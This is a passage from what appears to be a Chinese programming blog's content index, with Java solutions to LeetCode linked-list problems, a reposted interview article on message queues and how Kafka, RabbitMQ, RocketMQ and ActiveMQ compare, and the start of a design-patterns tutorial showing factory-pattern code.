&#125;</span><br></pre></td></tr></table></figure><h2><span id="148-sort-list">148. Sort List ×</span></h2><p>  Sort a linked list in <em>O</em>(<em>n</em> log <em>n</em>) time using constant space complexity.</p><p>  <strong>Example 1:</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure><p>  <strong>Example 2:</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="keyword">null</span>||head.next==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">       ListNode pre=<span class="keyword">null</span>,slow=head,fast=head;</span><br><span class="line">       <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           pre=slow;</span><br><span class="line">           slow=slow.next;</span><br><span class="line">           fast=fast.next.next;</span><br><span class="line">       &#125;</span><br><span class="line">       pre.next=<span class="keyword">null</span>;</span><br><span class="line">       ListNode l1=sortList(head);</span><br><span class="line">       ListNode l2=sortList(slow);</span><br><span class="line">       <span class="keyword">return</span> merge(l1,l2);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function">ListNode <span class="title">merge</span><span class="params">(ListNode l1,ListNode l2)</span></span>&#123;</span><br><span class="line">       ListNode l = <span class="keyword">new</span> ListNode(<span class="number">0</span>),p=l;</span><br><span class="line">       <span class="keyword">while</span>(l1!=<span class="keyword">null</span>&amp;&amp;l2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(l1.val&gt;l2.val)&#123;</span><br><span class="line">               p.next=l2;</span><br><span class="line">               l2=l2.next;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               p.next=l1;</span><br><span class="line">               l1=l1.next;</span><br><span class="line">           &#125;</span><br><span class="line">           p=p.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(l1!=<span class="keyword">null</span>) p.next=l1;</span><br><span class="line">       <span class="keyword">if</span>(l2!=<span class="keyword">null</span>) p.next=l2;</span><br><span class="line">       <span class="keyword">return</span> l.next;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="138-copy-list-with-random-pointer">138. Copy List with Random Pointer √</span></h2><p>  A linked list is given such that each node contains an additional random pointer which could point to any node in the list or null.</p><p>  Return a <a href="https://en.wikipedia.org/wiki/Object_copying#Deep_copy" target="_blank" rel="noopener"><strong>deep copy</strong></a> of the list.</p><p>  The Linked List is represented in the input/output as a list of <code>n</code> nodes. Each node is represented as a pair of <code>[val, random_index]</code> where:</p><ul><li><code>val</code>: an integer representing <code>Node.val</code></li><li><code>random_index</code>: the index of the node (range from <code>0</code> to <code>n-1</code>) where random pointer points to, or <code>null</code> if it does not point to any node.  </li></ul><p>  <strong>Example 1:</strong></p><p>  <img src="https://assets.leetcode.com/uploads/2019/12/18/e1.png" alt="img"></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head &#x3D; [[7,null],[13,0],[11,4],[10,2],[1,0]]</span><br><span class="line">Output: [[7,null],[13,0],[11,4],[10,2],[1,0]]</span><br></pre></td></tr></table></figure><p>  <strong>Example 2:</strong></p><p>  <img src="https://assets.leetcode.com/uploads/2019/12/18/e2.png" alt="img"></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: head &#x3D; [[1,1],[2,1]]</span><br><span class="line">Output: [[1,1],[2,1]]</span><br></pre></td></tr></table></figure><p>  这道题按着3步走就行了</p><ol><li><p>遍历一次链表，将链表复制一次：</p><p>1-&gt;2-&gt;3   变成  1-&gt;1-&gt;2-&gt;2-&gt;3-&gt;3</p></li><li><p>将原有的random指针赋予新建的集合，新集合的random指针指向原有集合random的next</p></li><li><p>将链表分成两个部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Node <span class="title">copyRandomList</span><span class="params">(Node head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    Node phead=head;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        Node tmp = <span class="keyword">new</span> Node(phead.val);</span><br><span class="line">        phead.next=tmp;</span><br><span class="line">        tmp.next=next;</span><br><span class="line">        phead=next;</span><br><span class="line">    &#125;</span><br><span class="line">    phead=head;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        Node r=phead.random;</span><br><span class="line">        <span class="keyword">if</span>(r!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            next.random=r.next;</span><br><span class="line">        &#125;            </span><br><span class="line">        phead=next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    phead=head;</span><br><span class="line">    Node res=head.next;</span><br><span class="line">    <span class="keyword">while</span>(phead!=<span class="keyword">null</span>&amp;&amp;phead.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Node next=phead.next;</span><br><span class="line">        phead.next=next.next;</span><br><span class="line">        phead=next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么使用消息队列【转】</title>
      <link href="/2020/03/22/queue-0/"/>
      <url>/2020/03/22/queue-0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>为什么使用消息队列？<br>消息队列有什么优点和缺点？<br>Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？<br> <a id="more"></a></p><!-- toc --><ul><li><a href="#面试题">面试题</a></li><li><a href="#面试官心理分析">面试官心理分析</a></li><li><a href="#面试题剖析">面试题剖析</a><ul><li><a href="#为什么使用消息队列">为什么使用消息队列</a><ul><li><a href="#解耦">解耦</a></li><li><a href="#异步">异步</a></li><li><a href="#削峰">削峰</a></li></ul></li><li><a href="#消息队列有什么优缺点">消息队列有什么优缺点</a></li><li><a href="#kafka-activemq-rabbitmq-rocketmq-有什么优缺点">Kafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点？</a></li></ul></li></ul><!-- tocstop --><h2><span id="面试题">面试题</span></h2><ul><li>为什么使用消息队列？</li><li>消息队列有什么优点和缺点？</li><li>Kafka、ActiveMQ、RabbitMQ、RocketMQ 都有什么区别，以及适合哪些场景？</li></ul><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实面试官主要是想看看：</p><ul><li><p><strong>第一</strong>，你知不知道你们系统里为什么要用消息队列这个东西？<br><br>不少候选人，说自己项目里用了 Redis、MQ，但是其实他并不知道自己为什么要用这个东西。其实说白了，就是为了用而用，或者是别人设计的架构，他从头到尾都没思考过。<br><br>没有对自己的架构问过为什么的人，一定是平时没有思考的人，面试官对这类候选人印象通常很不好。因为面试官担心你进了团队之后只会木头木脑的干呆活儿，不会自己思考。</p></li><li><p><strong>第二</strong>，你既然用了消息队列这个东西，你知不知道用了有什么好处&amp;坏处？<br><br>你要是没考虑过这个，那你盲目弄个 MQ 进系统里，后面出了问题你是不是就自己溜了给公司留坑？你要是没考虑过引入一个技术可能存在的弊端和风险，面试官把这类候选人招进来了，基本可能就是挖坑型选手。就怕你干 1 年挖一堆坑，自己跳槽了，给公司留下无穷后患。</p></li><li><p><strong>第三</strong>，既然你用了 MQ，可能是某一种 MQ，那么你当时做没做过调研？<br><br>你别傻乎乎的自己拍脑袋看个人喜好就瞎用了一个 MQ，比如 Kafka，甚至都从没调研过业界流行的 MQ 到底有哪几种。每一个 MQ 的优点和缺点是什么。每一个 MQ <strong>没有绝对的好坏</strong>，但是就是看用在哪个场景可以<strong>扬长避短，利用其优势，规避其劣势</strong>。<br><br>如果是一个不考虑技术选型的候选人招进了团队，leader 交给他一个任务，去设计个什么系统，他在里面用一些技术，可能都没考虑过选型，最后选的技术可能并不一定合适，一样是留坑。</p></li></ul><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="为什么使用消息队列">为什么使用消息队列</span></h3><p>其实就是问问你消息队列都有哪些使用场景，然后你项目里具体是什么场景，说说你在这个场景里用消息队列是什么？</p><p>面试官问你这个问题，<strong>期望的一个回答</strong>是说，你们公司有个什么<strong>业务场景</strong>，这个业务场景有个什么技术挑战，如果不用 MQ 可能会很麻烦，但是你现在用了 MQ 之后带给了你很多的好处。</p><p>先说一下消息队列常见的使用场景吧，其实场景有很多，但是比较核心的有 3 个：<strong>解耦</strong>、<strong>异步</strong>、<strong>削峰</strong>。</p><h4><span id="解耦">解耦</span></h4><p>看这么个场景。A 系统发送数据到 BCD 三个系统，通过接口调用发送。如果 E 系统也要这个数据呢？那如果 C 系统现在不需要了呢？A 系统负责人几乎崩溃……</p><p><img src="mq-1.png" alt="mq-1"></p><p>在这个场景中，A 系统跟其它各种乱七八糟的系统严重耦合，A 系统产生一条比较关键的数据，很多系统都需要 A 系统将这个数据发送过来。A 系统要时时刻刻考虑 BCDE 四个系统如果挂了该咋办？要不要重发，要不要把消息存起来？头发都白了啊！</p><p>如果使用 MQ，A 系统产生一条数据，发送到 MQ 里面去，哪个系统需要数据自己去 MQ 里面消费。如果新系统需要数据，直接从 MQ 里消费即可；如果某个系统不需要这条数据了，就取消对 MQ 消息的消费即可。这样下来，A 系统压根儿不需要去考虑要给谁发送数据，不需要维护这个代码，也不需要考虑人家是否调用成功、失败超时等情况。</p><p><img src="mq-2.png" alt="mq-2"></p><p><strong>总结</strong>：通过一个 MQ，Pub/Sub 发布订阅消息这么一个模型，A 系统就跟其它系统彻底解耦了。</p><p><strong>面试技巧</strong>：你需要去考虑一下你负责的系统中是否有类似的场景，就是一个系统或者一个模块，调用了多个系统或者模块，互相之间的调用很复杂，维护起来很麻烦。但是其实这个调用是不需要直接同步调用接口的，如果用 MQ 给它异步化解耦，也是可以的，你就需要去考虑在你的项目里，是不是可以运用这个 MQ 去进行系统的解耦。在简历中体现出来这块东西，用 MQ 作解耦。</p><h4><span id="异步">异步</span></h4><p>再来看一个场景，A 系统接收一个请求，需要在自己本地写库，还需要在 BCD 三个系统写库，自己本地写库要 3ms，BCD 三个系统分别写库要 300ms、450ms、200ms。最终请求总延时是 3 + 300 + 450 + 200 = 953ms，接近 1s，用户感觉搞个什么东西，慢死了慢死了。用户通过浏览器发起请求，等待个 1s，这几乎是不可接受的。</p><p><img src="mq-3.png" alt="mq-3"></p><p>一般互联网类的企业，对于用户直接的操作，一般要求是每个请求都必须在 200 ms 以内完成，对用户几乎是无感知的。</p><p>如果<strong>使用 MQ</strong>，那么 A 系统连续发送 3 条消息到 MQ 队列中，假如耗时 5ms，A 系统从接受一个请求到返回响应给用户，总时长是 3 + 5 = 8ms，对于用户而言，其实感觉上就是点个按钮，8ms 以后就直接返回了，爽！网站做得真好，真快！</p><p><img src="mq-4.png" alt="mq-4"></p><h4><span id="削峰">削峰</span></h4><p>每天 0:00 到 12:00，A 系统风平浪静，每秒并发请求数量就 50 个。结果每次一到 12:00 ~ 13:00 ，每秒并发请求数量突然会暴增到 5k+ 条。但是系统是直接基于 MySQL 的，大量的请求涌入 MySQL，每秒钟对 MySQL 执行约 5k 条 SQL。</p><p>一般的 MySQL，扛到每秒 2k 个请求就差不多了，如果每秒请求到 5k 的话，可能就直接把 MySQL 给打死了，导致系统崩溃，用户也就没法再使用系统了。</p><p>但是高峰期一过，到了下午的时候，就成了低峰期，可能也就 1w 的用户同时在网站上操作，每秒中的请求数量可能也就 50 个请求，对整个系统几乎没有任何的压力。</p><p><img src="mq-5.png" alt="mq-5"></p><p>如果使用 MQ，每秒 5k 个请求写入 MQ，A 系统每秒钟最多处理 2k 个请求，因为 MySQL 每秒钟最多处理 2k 个。A 系统从 MQ 中慢慢拉取请求，每秒钟就拉取 2k 个请求，不要超过自己每秒能处理的最大请求数量就 ok，这样下来，哪怕是高峰期的时候，A 系统也绝对不会挂掉。而 MQ 每秒钟 5k 个请求进来，就 2k 个请求出去，结果就导致在中午高峰期（1 个小时），可能有几十万甚至几百万的请求积压在 MQ 中。</p><p><img src="mq-6.png" alt="mq-6"></p><p>这个短暂的高峰期积压是 ok 的，因为高峰期过了之后，每秒钟就 50 个请求进 MQ，但是 A 系统依然会按照每秒 2k 个请求的速度在处理。所以说，只要高峰期一过，A 系统就会快速将积压的消息给解决掉。</p><h3><span id="消息队列有什么优缺点">消息队列有什么优缺点</span></h3><p>优点上面已经说了，就是<strong>在特殊场景下有其对应的好处</strong>，<strong>解耦</strong>、<strong>异步</strong>、<strong>削峰</strong>。</p><p>缺点有以下几个：</p><ul><li><p>系统可用性降低<br><br>系统引入的外部依赖越多，越容易挂掉。本来你就是 A 系统调用 BCD 三个系统的接口就好了，ABCD 四个系统还好好的，没啥问题，你偏加个 MQ 进来，万一 MQ 挂了咋整？MQ 一挂，整套系统崩溃，你不就完了？如何保证消息队列的高可用，可以<a href="/2020/03/22/Design-Pattern/" title="点击这里">点击这里</a>。</p></li><li><p>系统复杂度提高<br><br>硬生生加个 MQ 进来，你怎么<a href="/docs/high-concurrency/how-to-ensure-that-messages-are-not-repeatedly-consumed.md">保证消息没有重复消费</a>？怎么<a href="/docs/high-concurrency/how-to-ensure-the-reliable-transmission-of-messages.md">处理消息丢失的情况</a>？怎么保证消息传递的顺序性？头大头大，问题一大堆，痛苦不已。</p></li><li><p>一致性问题<br><br>A 系统处理完了直接返回成功了，人都以为你这个请求就成功了；但是问题是，要是 BCD 三个系统那里，BD 两个系统写库成功了，结果 C 系统写库失败了，咋整？你这数据就不一致了。</p></li></ul><p>所以消息队列实际是一种非常复杂的架构，你引入它有很多好处，但是也得针对它带来的坏处做各种额外的技术方案和架构来规避掉，做好之后，你会发现，妈呀，系统复杂度提升了一个数量级，也许是复杂了 10 倍。但是关键时刻，用，还是得用的。</p><h3><span id="kafka-activemq-rabbitmq-rocketmq-有什么优缺点">Kafka、ActiveMQ、RabbitMQ、RocketMQ 有什么优缺点？</span></h3><table><thead><tr><th>特性</th><th>ActiveMQ</th><th>RabbitMQ</th><th>RocketMQ</th><th>Kafka</th></tr></thead><tbody><tr><td>单机吞吐量</td><td>万级，比 RocketMQ、Kafka 低一个数量级</td><td>同 ActiveMQ</td><td>10 万级，支撑高吞吐</td><td>10 万级，高吞吐，一般配合大数据类的系统来进行实时数据计算、日志采集等场景</td></tr><tr><td>topic 数量对吞吐量的影响</td><td></td><td></td><td>topic 可以达到几百/几千的级别，吞吐量会有较小幅度的下降，这是 RocketMQ 的一大优势，在同等机器下，可以支撑大量的 topic</td><td>topic 从几十到几百个时候，吞吐量会大幅度下降，在同等机器下，Kafka 尽量保证 topic 数量不要过多，如果要支撑大规模的 topic，需要增加更多的机器资源</td></tr><tr><td>时效性</td><td>ms 级</td><td>微秒级，这是 RabbitMQ 的一大特点，延迟最低</td><td>ms 级</td><td>延迟在 ms 级以内</td></tr><tr><td>可用性</td><td>高，基于主从架构实现高可用</td><td>同 ActiveMQ</td><td>非常高，分布式架构</td><td>非常高，分布式，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用</td></tr><tr><td>消息可靠性</td><td>有较低的概率丢失数据</td><td>基本不丢</td><td>经过参数优化配置，可以做到 0 丢失</td><td>同 RocketMQ</td></tr><tr><td>功能支持</td><td>MQ 领域的功能极其完备</td><td>基于 erlang 开发，并发能力很强，性能极好，延时很低</td><td>MQ 功能较为完善，还是分布式的，扩展性好</td><td>功能较为简单，主要支持简单的 MQ 功能，在大数据领域的实时计算以及日志采集被大规模使用</td></tr></tbody></table><p>综上，各种对比之后，有如下建议：</p><p>一般的业务系统要引入 MQ，最早大家都用 ActiveMQ，但是现在确实大家用的不多了，没经过大规模吞吐量场景的验证，社区也不是很活跃，所以大家还是算了吧，我个人不推荐用这个了；</p><p>后来大家开始用 RabbitMQ，但是确实 erlang 语言阻止了大量的 Java 工程师去深入研究和掌控它，对公司而言，几乎处于不可控的状态，但是确实人家是开源的，比较稳定的支持，活跃度也高；</p><p>不过现在确实越来越多的公司会去用 RocketMQ，确实很不错，毕竟是阿里出品，但社区可能有突然黄掉的风险（目前 RocketMQ 已捐给 <a href="https://github.com/apache/rocketmq" target="_blank" rel="noopener">Apache</a>，但 GitHub 上的活跃度其实不算高）对自己公司技术实力有绝对自信的，推荐用 RocketMQ，否则回去老老实实用 RabbitMQ 吧，人家有活跃的开源社区，绝对不会黄。</p><p>所以<strong>中小型公司</strong>，技术实力较为一般，技术挑战不是特别高，用 RabbitMQ 是不错的选择；<strong>大型公司</strong>，基础架构研发实力较强，用 RocketMQ 是很好的选择。</p><p>如果是<strong>大数据领域</strong>的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式考点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式也可以这么简单【转】</title>
      <link href="/2020/03/22/Design-Pattern/"/>
      <url>/2020/03/22/Design-Pattern/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#创建型模式">创建型模式</a><ul><li><a href="#简单工厂模式">简单工厂模式</a></li><li><a href="#工厂模式">工厂模式</a></li><li><a href="#抽象工厂模式">抽象工厂模式</a></li><li><a href="#单例模式">单例模式</a></li><li><a href="#建造者模式">建造者模式</a></li><li><a href="#原型模式">原型模式</a></li><li><a href="#创建型模式总结">创建型模式总结</a></li></ul></li><li><a href="#结构型模式">结构型模式</a><ul><li><a href="#代理模式">代理模式</a></li><li><a href="#适配器模式">适配器模式</a><ul><li><a href="#默认适配器模式">默认适配器模式</a></li><li><a href="#对象适配器模式">对象适配器模式</a></li><li><a href="#类适配器模式">类适配器模式</a></li><li><a href="#适配器模式总结">适配器模式总结</a></li></ul></li><li><a href="#桥梁模式">桥梁模式</a></li><li><a href="#装饰模式">装饰模式</a></li><li><a href="#门面模式">门面模式</a></li><li><a href="#组合模式">组合模式</a></li><li><a href="#享元模式">享元模式</a></li><li><a href="#结构型模式总结">结构型模式总结</a></li></ul></li><li><a href="#行为型模式">行为型模式</a><ul><li><a href="#策略模式">策略模式</a></li><li><a href="#观察者模式">观察者模式</a></li><li><a href="#责任链模式">责任链模式</a></li><li><a href="#模板方法模式">模板方法模式</a></li><li><a href="#状态模式">状态模式</a></li><li><a href="#行为型模式总结">行为型模式总结</a></li></ul></li><li><a href="#总结">总结</a><ul><li><a href="#jdk中的设计模式">JDK中的设计模式</a></li></ul></li><li><a href="#creational创建模式">Creational（创建模式）</a><ul><li><a href="#abstract-factory抽象工厂模式">Abstract factory（抽象工厂模式）:</a></li><li><a href="#builder建造者模式">Builder（建造者模式）:</a></li><li><a href="#factory工厂模式">Factory（工厂模式）:</a></li><li><a href="#prototype原型模式">Prototype（原型模式）:</a></li><li><a href="#singleton单例模式">Singleton（单例模式）:</a></li></ul></li><li><a href="#structural结构模式">Structural（结构模式）</a><ul><li><a href="#adapter适配器模式">Adapter（适配器模式）:</a></li><li><a href="#bridge桥梁模式">Bridge（桥梁模式）：</a></li><li><a href="#composite组合模式">Composite（组合模式）:</a></li><li><a href="#decorator装饰模式">Decorator（装饰模式）:</a></li><li><a href="#facade门面模式">Facade（门面模式）:</a></li><li><a href="#flyweight享元模式">Flyweight（享元模式）:</a></li><li><a href="#proxy代理模式">Proxy（代理模式）:</a></li></ul></li><li><a href="#behavioral行为模式">Behavioral(行为模式)</a><ul><li><a href="#chain-of-responsibility责任链模式">Chain of responsibility（责任链模式）:</a></li><li><a href="#command命令模式">Command（命令模式）:</a></li><li><a href="#interpreter">Interpreter:</a></li><li><a href="#iterator">Iterator:</a></li><li><a href="#mediator">Mediator:</a></li><li><a href="#memento备忘录模式">Memento（备忘录模式）:</a></li><li><a href="#null-object">Null Object:</a></li><li><a href="#observer观察者模式">Observer（观察者模式）:</a></li><li><a href="#state状态模式">State（状态模式）:</a></li><li><a href="#strategy策略模式">Strategy（策略模式）:</a></li><li><a href="#template-method模板模式">Template method（模板模式）:</a></li><li><a href="#visitor">Visitor:</a></li></ul></li></ul><!-- tocstop --><p>一直想写一篇介绍设计模式的文章，让读者可以很快看完，而且一看就懂，看懂就会用，同时不会将各个模式搞混。自认为本文还是写得不错的😂😂😂，花了不少心思来写这文章和做图，力求让读者真的能看着简单同时有所收获。</p><p>设计模式是对大家实际工作中写的各种代码进行高层次抽象的总结，其中最出名的当属 <em>Gang of Four</em> (<em>GoF</em>) 的分类了，他们将设计模式分类为 23 种经典的模式，根据用途我们又可以分为三大类，分别为创建型模式、结构型模式和行为型模式。</p><p>有一些重要的设计原则在开篇和大家分享下，这些原则将贯通全文：</p><ol><li>面向接口编程，而不是面向实现。这个很重要，也是优雅的、可扩展的代码的第一步，这就不需要多说了吧。</li><li>职责单一原则。每个类都应该只有一个单一的功能，并且该功能应该由这个类完全封装起来。</li><li>对修改关闭，对扩展开放。对修改关闭是说，我们辛辛苦苦加班写出来的代码，该实现的功能和该修复的 bug 都完成了，别人可不能说改就改；对扩展开放就比较好理解了，也就是说在我们写好的代码基础上，很容易实现扩展。</li></ol><p><strong>创建型模式比较简单，但是会比较没有意思，结构型和行为型比较有意思。</strong></p><h2><span id="创建型模式">创建型模式</span></h2><p>创建型模式的作用就是创建对象，说到创建一个对象，最熟悉的就是 new 一个对象，然后 set 相关属性。但是，在很多场景下，我们需要给客户端提供更加友好的创建对象的方式，尤其是那种我们定义了类，但是需要提供给其他开发者用的时候。</p><h3><span id="简单工厂模式">简单工厂模式</span></h3><p>和名字一样简单，非常简单，直接上代码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FoodFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Food <span class="title">makeFood</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"noodle"</span>)) &#123;</span><br><span class="line">            Food noodle = <span class="keyword">new</span> LanZhouNoodle();</span><br><span class="line">            noodle.addSpicy(<span class="string">"more"</span>);</span><br><span class="line">            <span class="keyword">return</span> noodle;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">"chicken"</span>)) &#123;</span><br><span class="line">            Food chicken = <span class="keyword">new</span> HuangMenChicken();</span><br><span class="line">            chicken.addCondiment(<span class="string">"potato"</span>);</span><br><span class="line">            <span class="keyword">return</span> chicken;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>其中，LanZhouNoodle 和 HuangMenChicken 都继承自 Food。</em></p><p>简单地说，简单工厂模式通常就是这样，一个工厂类 XxxFactory，里面有一个静态方法，根据我们不同的参数，返回不同的派生自同一个父类（或实现同一接口）的实例对象。</p><blockquote><p>我们强调<strong>职责单一</strong>原则，一个类只提供一种功能，FoodFactory 的功能就是只要负责生产各种 Food。</p></blockquote><h3><span id="工厂模式">工厂模式</span></h3><p>简单工厂模式很简单，如果它能满足我们的需要，我觉得就不要折腾了。之所以需要引入工厂模式，是因为我们往往需要使用两个或两个以上的工厂。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FoodFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">Food <span class="title">makeFood</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChineseFoodFactory</span> <span class="keyword">implements</span> <span class="title">FoodFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeFood</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"A"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ChineseFoodA();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">"B"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ChineseFoodB();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AmericanFoodFactory</span> <span class="keyword">implements</span> <span class="title">FoodFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeFood</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"A"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AmericanFoodA();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">"B"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AmericanFoodB();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，ChineseFoodA、ChineseFoodB、AmericanFoodA、AmericanFoodB 都派生自 Food。</p><p>客户端调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 